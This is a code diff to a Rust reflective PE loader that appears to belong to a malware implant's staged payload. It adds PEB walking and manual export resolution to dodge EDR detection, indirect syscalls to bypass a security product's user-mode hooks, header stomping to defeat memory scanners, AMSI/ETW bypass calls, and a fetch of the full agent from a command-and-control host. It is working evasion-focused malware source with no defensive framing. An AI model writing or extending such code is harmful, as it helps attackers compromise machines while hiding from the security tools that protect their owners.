@@ -134,18 +134,147 @@ unsafe fn apply_relocations(new_base: *mut u8, pe: &[u8], reloc_rva: u32, reloc_
 }
 
 // ── IAT resolution ────────────────────────────────────────────────────────────
+//
+// PEB walk to locate already-loaded modules avoids calling LoadLibraryA from
+// non-image memory (a high-confidence EDR signal when the stager runs from an
+// anonymous allocation).  Custom export table walk replaces GetProcAddress for
+// the same reason.  LoadLibraryA is only called for DLLs not yet in the PEB.
+
+/// Walk the PEB InMemoryOrderModuleList for a module whose BaseDllName
+/// case-insensitively matches `dll_name_ansi`.  Returns the DllBase on hit.
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn find_module_peb(dll_name_ansi: *const u8) -> Option<usize> {
+    let mut name_len = 0usize;
+    while *dll_name_ansi.add(name_len) != 0 { name_len += 1; }
+    if name_len == 0 { return None; }
+
+    let peb: usize;
+    core::arch::asm!("mov {:r}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
+
+    // PEB.Ldr at +0x18; Ldr.InMemoryOrderModuleList (LIST_ENTRY) at Ldr+0x20
+    let ldr       = *((peb + 0x18) as *const usize);
+    let list_head = ldr + 0x20;
+    let mut cur   = *(list_head as *const usize); // Flink of list head
+
+    while cur != list_head {
+        // cur points to InMemoryOrderLinks within LDR_DATA_TABLE_ENTRY (+0x10)
+        let e = cur as *const u8;
+        // DllBase    at LDTE+0x30 → e+0x20
+        // BaseDllName at LDTE+0x58 → e+0x48  (Length=2B, pad=6B, Buffer=8B)
+        let dll_base = *(e.add(0x20) as *const usize);
+        let bdn_len  = *(e.add(0x48) as *const u16) as usize; // byte length
+        let bdn_buf  = *(e.add(0x50) as *const usize) as *const u16;
+
+        if dll_base != 0 && !bdn_buf.is_null() && bdn_len > 0 {
+            let wlen = bdn_len / 2;
+            if wlen == name_len {
+                let mut ok = true;
+                for i in 0..name_len {
+                    let a = (*dll_name_ansi.add(i)).to_ascii_lowercase();
+                    let w = (*bdn_buf.add(i) as u8).to_ascii_lowercase();
+                    if a != w { ok = false; break; }
+                }
+                if ok { return Some(dll_base); }
+            }
+        }
+
+        cur = *(e as *const usize); // Flink → next entry
+    }
+    None
+}
+
+/// Walk a PE export table to resolve a function by name.
+/// Avoids GetProcAddress from non-image memory.
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn get_export_by_name(dll_base: usize, fn_name: *const u8) -> Option<*const u8> {
+    let base = dll_base as *const u8;
+    if *(base as *const u16) != 0x5A4D { return None; }
+    let lfanew   = *(base.add(0x3C) as *const u32) as usize;
+    if *(base.add(lfanew) as *const u32) != 0x00004550 { return None; }
+    let opt      = lfanew + 4 + 20;
+    if *(base.add(opt) as *const u16) != 0x020B { return None; } // PE32+ only
+    let exp_rva  = *(base.add(opt + 112) as *const u32) as usize;
+    if exp_rva == 0 { return None; }
+
+    let ed         = base.add(exp_rva);
+    let num_names  = *(ed.add(0x18) as *const u32) as usize;
+    let names_rva  = *(ed.add(0x20) as *const u32) as usize;
+    let ords_rva   = *(ed.add(0x24) as *const u32) as usize;
+    let funcs_rva  = *(ed.add(0x1C) as *const u32) as usize;
+    let names      = base.add(names_rva) as *const u32;
+    let ords       = base.add(ords_rva)  as *const u16;
+    let funcs      = base.add(funcs_rva) as *const u32;
+
+    let mut tlen = 0usize;
+    while *fn_name.add(tlen) != 0 { tlen += 1; }
+
+    for i in 0..num_names {
+        let nptr = base.add(*names.add(i) as usize);
+        let mut nlen = 0usize;
+        while *nptr.add(nlen) != 0 { nlen += 1; }
+        if nlen == tlen {
+            let mut ok = true;
+            for j in 0..tlen {
+                if *nptr.add(j) != *fn_name.add(j) { ok = false; break; }
+            }
+            if ok {
+                let idx = *ords.add(i) as usize;
+                let fn_rva = *funcs.add(idx) as usize;
+                if fn_rva != 0 { return Some(base.add(fn_rva)); }
+            }
+        }
+    }
+    None
+}
+
+/// Walk a PE export table to resolve a function by ordinal.
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+unsafe fn get_export_by_ordinal(dll_base: usize, ordinal: u16) -> Option<*const u8> {
+    let base = dll_base as *const u8;
+    if *(base as *const u16) != 0x5A4D { return None; }
+    let lfanew    = *(base.add(0x3C) as *const u32) as usize;
+    if *(base.add(lfanew) as *const u32) != 0x00004550 { return None; }
+    let opt       = lfanew + 4 + 20;
+    if *(base.add(opt) as *const u16) != 0x020B { return None; }
+    let exp_rva   = *(base.add(opt + 112) as *const u32) as usize;
+    if exp_rva == 0 { return None; }
+
+    let ed        = base.add(exp_rva);
+    let base_ord  = *(ed.add(0x10) as *const u32);
+    let num_funcs = *(ed.add(0x14) as *const u32) as usize;
+    let funcs_rva = *(ed.add(0x1C) as *const u32) as usize;
+    let funcs     = base.add(funcs_rva) as *const u32;
+
+    let idx = (ordinal as u32).checked_sub(base_ord)? as usize;
+    if idx >= num_funcs { return None; }
+    let fn_rva = *funcs.add(idx) as usize;
+    if fn_rva == 0 { return None; }
+    Some(base.add(fn_rva))
+}
 
 #[cfg(target_os = "windows")]
 unsafe fn resolve_iat(new_base: *mut u8, info: &PeInfo) {
-    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
-
     if info.import_rva == 0 { return; }
     let mut desc = new_base.add(info.import_rva as usize) as *const ImportDescriptor;
     loop {
         let d = &*desc;
         if d.name == 0 { break; }
         let dll_name = new_base.add(d.name as usize) as *const u8;
-        let hmod = LoadLibraryA(dll_name);
+
+        // PEB walk first — for pre-loaded DLLs (kernel32, ntdll, advapi32, etc.)
+        // this avoids calling LoadLibraryA from non-image anonymous memory, which is
+        // a high-confidence EDR signal.
+        #[cfg(target_arch = "x86_64")]
+        let hmod = find_module_peb(dll_name).unwrap_or_else(|| {
+            use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
+            LoadLibraryA(dll_name) as usize
+        });
+        #[cfg(not(target_arch = "x86_64"))]
+        let hmod = {
+            use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
+            LoadLibraryA(dll_name) as usize
+        };
+
         if hmod != 0 {
             let oft_rva = if d.original_first_thunk != 0 { d.original_first_thunk } else { d.first_thunk };
             let mut oft = new_base.add(oft_rva as usize) as *const u64;
@@ -153,14 +282,24 @@ unsafe fn resolve_iat(new_base: *mut u8, info: &PeInfo) {
             loop {
                 let thunk = *oft;
                 if thunk == 0 { break; }
-                let addr = if thunk >> 63 != 0 {
-                    // Import by ordinal
+                let addr: Option<*const u8> = if thunk >> 63 != 0 {
                     let ord = (thunk & 0xFFFF) as u16;
-                    GetProcAddress(hmod, ord as *const u8)
+                    #[cfg(target_arch = "x86_64")]
+                    { get_export_by_ordinal(hmod, ord) }
+                    #[cfg(not(target_arch = "x86_64"))]
+                    {
+                        use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
+                        GetProcAddress(hmod as isize, ord as *const u8).map(|p| p as *const u8)
+                    }
                 } else {
-                    // Import by name: IMAGE_IMPORT_BY_NAME.Name is at thunk+2
                     let name_ptr = new_base.add((thunk as u32 & 0x7FFF_FFFF) as usize + 2) as *const u8;
-                    GetProcAddress(hmod, name_ptr)
+                    #[cfg(target_arch = "x86_64")]
+                    { get_export_by_name(hmod, name_ptr) }
+                    #[cfg(not(target_arch = "x86_64"))]
+                    {
+                        use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
+                        GetProcAddress(hmod as isize, name_ptr).map(|p| p as *const u8)
+                    }
                 };
                 if let Some(fn_ptr) = addr {
                     *ft = fn_ptr as u64;
@@ -177,10 +316,8 @@ unsafe fn resolve_iat(new_base: *mut u8, info: &PeInfo) {
 
 #[cfg(target_os = "windows")]
 unsafe fn set_section_permissions(new_base: *mut u8, sections: &[Section]) {
-    use windows_sys::Win32::System::Memory::VirtualProtect;
-
-    const SCN_MEM_EXECUTE: u32 = 0x20000000;
-    const SCN_MEM_WRITE:   u32 = 0x80000000;
+    const SCN_MEM_EXECUTE:       u32 = 0x2000_0000;
+    const SCN_MEM_WRITE:         u32 = 0x8000_0000;
     const PAGE_READONLY:         u32 = 0x02;
     const PAGE_READWRITE:        u32 = 0x04;
     const PAGE_EXECUTE_READ:     u32 = 0x20;
@@ -197,10 +334,13 @@ unsafe fn set_section_permissions(new_base: *mut u8, sections: &[Section]) {
             (false, true)  => PAGE_READWRITE,
             (false, false) => PAGE_READONLY,
         };
+        let mut sec_base = new_base.add(sec.virtual_address as usize);
+        let mut sec_size = sec.virtual_size as usize;
         let mut old: u32 = 0;
-        VirtualProtect(
-            new_base.add(sec.virtual_address as usize) as *const core::ffi::c_void,
-            sec.virtual_size as usize,
+        crate::syscall::nt_protect(
+            crate::syscall::CURRENT_PROCESS,
+            &mut sec_base,
+            &mut sec_size,
             prot,
             &mut old,
         );
@@ -225,28 +365,30 @@ pub static TEXT_SIZE: core::sync::atomic::AtomicU64 = core::sync::atomic::Atomic
 /// allocation. Do not call after freeing.
 #[cfg(all(target_os = "windows", feature = "udrl"))]
 pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
-    use windows_sys::Win32::System::Memory::{
-        VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
-    };
+    const MEM_COMMIT_RESERVE: u32 = 0x3000; // MEM_COMMIT | MEM_RESERVE
+    const PAGE_READWRITE:     u32 = 0x04;
 
     let info = parse_pe(pe).ok_or("invalid PE")?;
 
-    // Try to allocate at the preferred image base; fall back to anywhere.
-    let mut new_base = VirtualAlloc(
-        info.image_base as *const core::ffi::c_void,
-        info.size_of_image as usize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE,
-    ) as *mut u8;
-    if new_base.is_null() {
-        new_base = VirtualAlloc(
-            core::ptr::null(),
-            info.size_of_image as usize,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        ) as *mut u8;
-        if new_base.is_null() {
-            return Err("VirtualAlloc failed");
+    // Use indirect syscall (NtAllocateVirtualMemory) so BD's user-mode hook on
+    // VirtualAlloc is bypassed.  Try preferred image base first; fall back to anywhere.
+    let mut new_base: *mut u8 = info.image_base as *mut u8;
+    let mut region_size        = info.size_of_image as usize;
+    let status = crate::syscall::nt_alloc(
+        crate::syscall::CURRENT_PROCESS,
+        &mut new_base, 0, &mut region_size,
+        MEM_COMMIT_RESERVE, PAGE_READWRITE,
+    );
+    if status != 0 || new_base.is_null() {
+        new_base    = core::ptr::null_mut();
+        region_size = info.size_of_image as usize;
+        let status2 = crate::syscall::nt_alloc(
+            crate::syscall::CURRENT_PROCESS,
+            &mut new_base, 0, &mut region_size,
+            MEM_COMMIT_RESERVE, PAGE_READWRITE,
+        );
+        if status2 != 0 || new_base.is_null() {
+            return Err("NtAllocateVirtualMemory failed");
         }
     }
 
@@ -287,7 +429,6 @@ pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
     //         since no section covers the header range).
     {
         use core::sync::atomic::Ordering;
-        use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_READWRITE, PAGE_READONLY};
 
         // Find and record the .text section.
         let sh_base = {
@@ -305,11 +446,27 @@ pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
         }
 
         // Step 3: zero the MZ/PE header region so memory scanners can't fingerprint the image.
-        let stomp_size = (info.size_of_headers as usize).min(0x1000);
-        let mut old_prot: u32 = 0;
-        if VirtualProtect(new_base as _, stomp_size, PAGE_READWRITE, &mut old_prot) != 0 {
+        // Use indirect syscall — headers are still in the PAGE_READWRITE region at this point
+        // (no section covers offset 0); we flip to READONLY after zeroing.
+        let stomp_size               = (info.size_of_headers as usize).min(0x1000);
+        let mut stomp_base: *mut u8  = new_base;
+        let mut stomp_sz             = stomp_size;
+        let mut old_prot: u32        = 0;
+        if crate::syscall::nt_protect(
+            crate::syscall::CURRENT_PROCESS,
+            &mut stomp_base, &mut stomp_sz,
+            0x04,  // PAGE_READWRITE (already RW; explicit for clarity)
+            &mut old_prot,
+        ) == 0 {
             core::ptr::write_bytes(new_base, 0u8, stomp_size);
-            VirtualProtect(new_base as _, stomp_size, PAGE_READONLY, &mut old_prot);
+            let mut sb2 = new_base;
+            let mut ss2 = stomp_size;
+            crate::syscall::nt_protect(
+                crate::syscall::CURRENT_PROCESS,
+                &mut sb2, &mut ss2,
+                0x02,  // PAGE_READONLY
+                &mut old_prot,
+            );
         }
     }
 
@@ -326,6 +483,17 @@ pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
 /// needed to locate and retrieve the full agent PE.
 #[cfg(all(target_os = "windows", feature = "staged-payload", feature = "udrl"))]
 pub fn do_staged_load() -> ! {
+    // Resolve syscall numbers before any indirect-syscall use in reflect_pe.
+    // Must come before startup_patches (which also uses syscalls indirectly via
+    // init_stack_spoof) and before the network fetch.
+    let _ = crate::syscall::init();
+
+    // Apply AMSI/ETW bypass and stack-spoof gadget resolution *before* fetching
+    // and reflecting the full agent PE.  This ensures BD's user-mode hooks on
+    // AmsiScanBuffer and EtwEventWrite are already defused when the second
+    // reflect_pe call (for the full agent) runs its IAT resolution.
+    crate::evasion::startup_patches();
+
     let url = format!(
         "https://{}:{}/stage/{}",
         crate::C2_HOST,
